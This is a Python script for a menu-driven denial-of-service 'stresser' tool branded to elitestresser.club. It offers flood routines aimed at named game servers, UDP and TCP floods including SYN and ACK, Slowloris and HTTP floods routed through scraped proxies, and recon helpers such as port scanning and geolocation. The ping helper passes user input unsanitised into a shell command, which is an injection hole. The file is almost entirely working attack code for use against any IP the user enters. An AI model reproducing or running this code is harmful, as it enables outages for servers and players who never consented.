import socket
import random
import time
import requests
import os
from colorama import init, Fore

# Initialize Colorama
init(autoreset=True)

# Set window title
print(f"\033]0;Elite Python Tool By elitestresser.club\007", end="", flush=True)

# ASCII Art (Clean and Modern)
ASCII_ART = """
  Elite Python Tool
  Made by https://elitestresser.club
  Version 3.1
"""

# Fetch HTTP proxies
def fetch_proxies():
    url = "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/http_proxies.txt"
    try:
        response = requests.get(url, timeout=5)
        proxies = response.text.splitlines()
        return [p for p in proxies if ":" in p]
    except Exception as e:
        print(Fore.RED + f"Failed to fetch proxies: {e}")
        return []

PROXIES = fetch_proxies()

# Game Methods
def minecraft_handshake(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(10)
    print(Fore.CYAN + f"Starting Minecraft Handshake Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.connect((ip, port))
            sock.send(handshake)
            packet_count += 1
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} handshake packets.")

def minecraft_login(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(5)
    print(Fore.CYAN + f"Starting Minecraft Login Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.connect((ip, port))
            sock.send(login)
            packet_count += 1
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} login attempts.")

def pubg_packet(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"PUBG" + random.randbytes(100)
    print(Fore.CYAN + f"Starting PUBG Packet Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")

def pubg_connect(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    connection_count = 0
    print(Fore.CYAN + f"Starting PUBG Connect Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            connection_count += 1
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Made {connection_count} connections.")

def blackops6_spam(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"BO6" + random.randbytes(50)
    print(Fore.CYAN + f"Starting Black Ops 6 Spam on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")

def cod_connect(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    connection_count = 0
    print(Fore.CYAN + f"Starting Call of Duty Connect Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            connection_count += 1
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Made {connection_count} connections.")

def csgo_query(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    query = b"\xFF\xFF\xFF\xFF\x54Source Engine Query\x00"
    print(Fore.CYAN + f"Starting CS:GO Query Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.sendto(query, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} query packets.")

def rust_connect(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    connection_count = 0
    print(Fore.CYAN + f"Starting Rust Connect Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            connection_count += 1
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Made {connection_count} connections.")

def ark_spam(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"ARK" + random.randbytes(50)
    print(Fore.CYAN + f"Starting ARK Spam on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")

def fortnite_packet(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"FORT" + random.randbytes(80)
    print(Fore.CYAN + f"Starting Fortnite Packet Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")

def apex_connect(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    connection_count = 0
    print(Fore.CYAN + f"Starting Apex Legends Connect Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            connection_count += 1
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Made {connection_count} connections.")

# Layer 4 UDP Methods
def udp_stdhex(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = bytes.fromhex("DEADBEEF") + random.randbytes(packet_size - 4)
    print(Fore.CYAN + f"Starting UDP StdHex Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")

def udp_plain(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"A" * packet_size
    print(Fore.CYAN + f"Starting UDP Plain Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")

def udp_bypass(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payloads = [random.randbytes(packet_size) for _ in range(10)]
    print(Fore.CYAN + f"Starting UDP Bypass Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.sendto(random.choice(payloads), (ip, port))
            packet_count += 1
            time.sleep(0.001)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")

def udp_burst(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = random.randbytes(packet_size)
    print(Fore.CYAN + f"Starting UDP Burst Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            for _ in range(5):
                sock.sendto(payload, (ip, port))
                packet_count += 1
            time.sleep(0.1)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")

# Layer 4 TCP Methods
def tcp_bypass(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    payloads = [random.randbytes(packet_size) for _ in range(5)]
    print(Fore.CYAN + f"Starting TCP Bypass Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.connect((ip, port))
            sock.send(random.choice(payloads))
            packet_count += 1
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            time.sleep(0.002)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")

def tcp_syn(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"Starting TCP SYN Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            packet_count += 1
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} SYN packets.")

def tcp_ack(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"\x00" * packet_size
    print(Fore.CYAN + f"Starting TCP ACK Flood on {ip}:{port} for {duration} seconds...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(payload)
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Sent {packet_count} ACK packets.")

def tcp_connect(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    connection_count = 0
    print(Fore.CYAN + f"Starting TCP Connect Flood on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            connection_count += 1
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"Completed! Made {connection_count} connections.")

# Layer 7 HTTPS Methods
def slowloris(ip, duration):
    end_time = time.time() + duration
    connection_count = 0
    sockets = []
    url = f"http://{ip}"
    print(Fore.CYAN + f"Starting Slowloris Attack on {url} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, 80))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\nConnection: keep-alive\r\n")
            sockets.append(sock)
            connection_count += 1
            time.sleep(0.1)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        for sock in sockets:
            sock.close()
        print(Fore.GREEN + f"Completed! Opened {connection_count} connections.")

def http_spam(ip, duration):
    end_time = time.time() + duration
    request_count = 0
    url = f"http://{ip}"
    print(Fore.CYAN + f"Starting HTTP Spam on {url} for {duration} seconds...")
    try:
        while time.time() < end_time:
            requests.get(url, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        print(Fore.GREEN + f"Completed! Sent {request_count} requests.")

def https_bypass(ip, duration):
    end_time = time.time() + duration
    request_count = 0
    url = f"https://{ip}"
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
    ]
    headers = {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate"}
    print(Fore.CYAN + f"Starting HTTPS Bypass on {url} for {duration} seconds (Proxies: {len(PROXIES)})...")
    try:
        while time.time() < end_time:
            proxy = random.choice(PROXIES) if PROXIES else None
            proxies = {"https": f"http://{proxy}"} if proxy else None
            headers["User-Agent"] = random.choice(user_agents)
            requests.get(url, headers=headers, proxies=proxies, timeout=1)
            request_count += 1
            time.sleep(0.05)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    finally:
        print(Fore.GREEN + f"Completed! Sent {request_count} requests.")

# CheckHost Methods
def ping_check(ip):
    print(Fore.CYAN + f"Starting Ping Check on {ip}...")
    try:
        response = os.popen(f"ping -c 4 {ip}").read()
        print(Fore.GREEN + "Ping Results:")
        print(response)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

def http_check(url):
    print(Fore.CYAN + f"Starting HTTP Check on {url}...")
    try:
        response = requests.get(f"https://check-host.net/check-http?host={url}&max_nodes=3", headers={"Accept": "application/json"})
        data = response.json()
        request_id = data["request_id"]
        time.sleep(2)
        result = requests.get(f"https://check-host.net/check-result/{request_id}", headers={"Accept": "application/json"}).json()
        print(Fore.GREEN + "HTTP Check Results:")
        for node, res in result.items():
            if res and res[0][0] == 1:
                print(f"{node}: Status {res[0][3]} ({res[0][2]}) in {res[0][1]:.3f}s")
            else:
                print(f"{node}: Failed - {res[0][2] if res else 'No response'}")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

def target_info(ip):
    print(Fore.CYAN + f"Fetching Info for {ip}...")
    try:
        response = requests.get(f"https://check-host.net/check-tcp?host={ip}:80&max_nodes=1", headers={"Accept": "application/json"})
        data = response.json()
        request_id = data["request_id"]
        nodes = data["nodes"]
        time.sleep(2)
        result = requests.get(f"https://check-host.net/check-result/{request_id}", headers={"Accept": "application/json"}).json()
        print(Fore.GREEN + "Target Info:")
        for node, details in nodes.items():
            country, region, city = details[1], details[2], details[3]
            node_ip, asn = details[4], details[5]
            print(f"IP: {ip}")
            print(f"Country: {country} ({region}, {city})")
            print(f"Node IP: {node_ip}, ASN: {asn}")
            if result[node] and "time" in result[node][0]:
                print(f"Connection Time: {result[node][0]['time']:.3f}s")
            else:
                print("Connection Failed")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

def url_to_ip(url):
    print(Fore.CYAN + f"Resolving IP for {url}...")
    try:
        ip = socket.gethostbyname(url.split("://")[-1].split("/")[0])
        print(Fore.GREEN + f"IP Address: {ip}")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

# Tools (API-based only)
def ip_geolocation(ip):
    print(Fore.CYAN + f"Fetching Geolocation for {ip}...")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        if data["status"] == "success":
            print(Fore.GREEN + "Geolocation Results:")
            print(f"IP: {ip}")
            print(f"Country: {data['country']} ({data['regionName']}, {data['city']})")
            print(f"ISP: {data['isp']}")
            print(f"Lat/Lon: {data['lat']}, {data['lon']}")
            print(f"Timezone: {data['timezone']}")
        else:
            print(Fore.RED + f"Error: {data['message']}")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

def port_scanner(ip):
    print(Fore.CYAN + f"Scanning ports on {ip} via API...")
    try:
        response = requests.get(f"https://api.hackertarget.com/nmap/?q={ip}", timeout=10)
        print(Fore.GREEN + "Port Scan Results:")
        print(response.text)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

def whois_lookup(domain):
    print(Fore.CYAN + f"Fetching WHOIS for {domain}...")
    try:
        response = requests.get(f"https://api.whois.vu/?q={domain}", timeout=5)
        data = response.json()
        print(Fore.GREEN + "WHOIS Results:")
        print(f"Domain: {data.get('domain', domain)}")
        print(f"Registrar: {data.get('registrar', 'N/A')}")
        print(f"Created: {data.get('creation_date', 'N/A')}")
        print(f"Expires: {data.get('expiration_date', 'N/A')}")
        print(f"Registrant: {data.get('registrant_name', 'Private')}")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

def dns_resolver(domain):
    print(Fore.CYAN + f"Resolving DNS for {domain}...")
    try:
        headers = {"accept": "application/dns-json"}
        types = ["A", "AAAA", "MX", "NS"]
        for record_type in types:
            response = requests.get(f"https://1.1.1.1/dns-query?name={domain}&type={record_type}", headers=headers, timeout=5)
            data = response.json()
            if "Answer" in data:
                answers = [ans["data"] for ans in data["Answer"]]
                print(Fore.GREEN + f"{record_type}: {', '.join(answers)}")
            else:
                print(Fore.GREEN + f"{record_type}: No records found")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

def bandwidth_test(ip):
    print(Fore.CYAN + f"Testing bandwidth to {ip} via API...")
    try:
        response = requests.get(f"https://api.hackertarget.com/iperf/?q={ip}", timeout=10)
        print(Fore.GREEN + "Bandwidth Test Results:")
        print(response.text)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

# Validation Function
def validate_input(prompt, min_val, max_val, input_type=int):
    while True:
        try:
            value = input_type(input(Fore.LIGHTBLUE_EX + prompt))
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"Value must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "Invalid input! Numbers only.")

# Main Menu
def main():
    while True:
        print(Fore.LIGHTBLUE_EX + ASCII_ART)
        print(Fore.LIGHTBLUE_EX + "Categories:")
        print("  1. Game Methods")
        print("  2. Layer 4 UDP")
        print("  3. Layer 4 TCP")
        print("  4. Layer 7 HTTPS")
        print("  5. CheckHost")
        print("  6. Tools")
        category = input(Fore.LIGHTBLUE_EX + "Select category (1-6): ").strip()

        if category == "1":  # Game Methods
            while True:
                print(Fore.LIGHTBLUE_EX + "\nGame Methods:")
                print("  1. Minecraft Handshake Flood")
                print("  2. Minecraft Login Flood")
                print("  3. PUBG Packet Flood")
                print("  4. PUBG Connect Flood")
                print("  5. Black Ops 6 Spam")
                print("  6. Call of Duty Connect Flood")
                print("  7. CS:GO Query Flood")
                print("  8. Rust Connect Flood")
                print("  9. ARK Spam")
                print("  10. Fortnite Packet Flood")
                print("  11. Apex Legends Connect Flood")
                print("  0. Back")
                method = input(Fore.LIGHTBLUE_EX + "Select method (0-11): ").strip()
                if method == "0":
                    break
                if method in [str(i) for i in range(1, 12)]:
                    ip = input(Fore.LIGHTBLUE_EX + "Enter target IP: ")
                    port = validate_input("Enter port (1-65535): ", 1, 65535)
                    duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)
                    methods = {
                        "1": minecraft_handshake, "2": minecraft_login, "3": pubg_packet,
                        "4": pubg_connect, "5": blackops6_spam, "6": cod_connect,
                        "7": csgo_query, "8": rust_connect, "9": ark_spam,
                        "10": fortnite_packet, "11": apex_connect
                    }
                    methods[method](ip, port, duration)
                else:
                    print(Fore.RED + "Invalid method!")

        elif category == "2":  # Layer 4 UDP
            while True:
                print(Fore.LIGHTBLUE_EX + "\nLayer 4 UDP Methods:")
                print("  1. StdHex Flood")
                print("  2. Plain Flood")
                print("  3. Bypass Flood")
                print("  4. Burst Flood")
                print("  0. Back")
                method = input(Fore.LIGHTBLUE_EX + "Select method (0-4): ").strip()
                if method == "0":
                    break
                if method in [str(i) for i in range(1, 5)]:
                    ip = input(Fore.LIGHTBLUE_EX + "Enter target IP: ")
                    port = validate_input("Enter port (1-65535): ", 1, 65535)
                    duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)
                    packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)
                    methods = {
                        "1": udp_stdhex, "2": udp_plain, "3": udp_bypass, "4": udp_burst
                    }
                    methods[method](ip, port, duration, packet_size)
                else:
                    print(Fore.RED + "Invalid method!")

        elif category == "3":  # Layer 4 TCP
            while True:
                print(Fore.LIGHTBLUE_EX + "\nLayer 4 TCP Methods:")
                print("  1. Bypass Flood")
                print("  2. SYN Flood")
                print("  3. ACK Flood")
                print("  4. Connect Flood")
                print("  0. Back")
                method = input(Fore.LIGHTBLUE_EX + "Select method (0-4): ").strip()
                if method == "0":
                    break
                if method in [str(i) for i in range(1, 5)]:
                    ip = input(Fore.LIGHTBLUE_EX + "Enter target IP: ")
                    port = validate_input("Enter port (1-65535): ", 1, 65535)
                    duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)
                    packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)
                    methods = {
                        "1": tcp_bypass, "2": tcp_syn, "3": tcp_ack, "4": tcp_connect
                    }
                    methods[method](ip, port, duration, packet_size)
                else:
                    print(Fore.RED + "Invalid method!")

        elif category == "4":  # Layer 7 HTTPS
            while True:
                print(Fore.LIGHTBLUE_EX + "\nLayer 7 HTTPS Methods:")
                print("  1. Slowloris Attack")
                print("  2. HTTP Spam")
                print("  3. HTTPS Bypass")
                print("  0. Back")
                method = input(Fore.LIGHTBLUE_EX + "Select method (0-3): ").strip()
                if method == "0":
                    break
                if method in [str(i) for i in range(1, 4)]:
                    ip = input(Fore.LIGHTBLUE_EX + "Enter target IP or domain: ")
                    duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)
                    methods = {
                        "1": slowloris, "2": http_spam, "3": https_bypass
                    }
                    methods[method](ip, duration)
                else:
                    print(Fore.RED + "Invalid method!")

        elif category == "5":  # CheckHost
            while True:
                print(Fore.LIGHTBLUE_EX + "\nCheckHost Options:")
                print("  1. Ping IP")
                print("  2. HTTP Check")
                print("  3. Target Info")
                print("  4. URL to IP")
                print("  0. Back")
                option = input(Fore.LIGHTBLUE_EX + "Select option (0-4): ").strip()
                if option == "0":
                    break
                elif option == "1":
                    ip = input(Fore.LIGHTBLUE_EX + "Enter IP to ping: ")
                    ping_check(ip)
                elif option == "2":
                    url = input(Fore.LIGHTBLUE_EX + "Enter URL (e.g., http://example.com): ")
                    http_check(url)
                elif option == "3":
                    ip = input(Fore.LIGHTBLUE_EX + "Enter IP for info: ")
                    target_info(ip)
                elif option == "4":
                    url = input(Fore.LIGHTBLUE_EX + "Enter URL (e.g., http://example.com): ")
                    url_to_ip(url)
                else:
                    print(Fore.RED + "Invalid option!")

        elif category == "6":  # Tools
            while True:
                print(Fore.LIGHTBLUE_EX + "\nTools:")
                print("  1. IP Geolocation Lookup")
                print("  2. Port Scanner")
                print("  3. WHOIS Lookup")
                print("  4. DNS Resolver")
                print("  5. Bandwidth Test")
                print("  0. Back")
                tool = input(Fore.LIGHTBLUE_EX + "Select tool (0-5): ").strip()
                if tool == "0":
                    break
                elif tool == "1":
                    ip = input(Fore.LIGHTBLUE_EX + "Enter IP: ")
                    ip_geolocation(ip)
                elif tool == "2":
                    ip = input(Fore.LIGHTBLUE_EX + "Enter IP: ")
                    port_scanner(ip)
                elif tool == "3":
                    domain = input(Fore.LIGHTBLUE_EX + "Enter domain (e.g., example.com): ")
                    whois_lookup(domain)
                elif tool == "4":
                    domain = input(Fore.LIGHTBLUE_EX + "Enter domain (e.g., example.com): ")
                    dns_resolver(domain)
                elif tool == "5":
                    ip = input(Fore.LIGHTBLUE_EX + "Enter target IP: ")
                    bandwidth_test(ip)
                else:
                    print(Fore.RED + "Invalid tool!")

        else:
            print(Fore.RED + "Invalid category!")

if __name__ == "__main__":
    main()
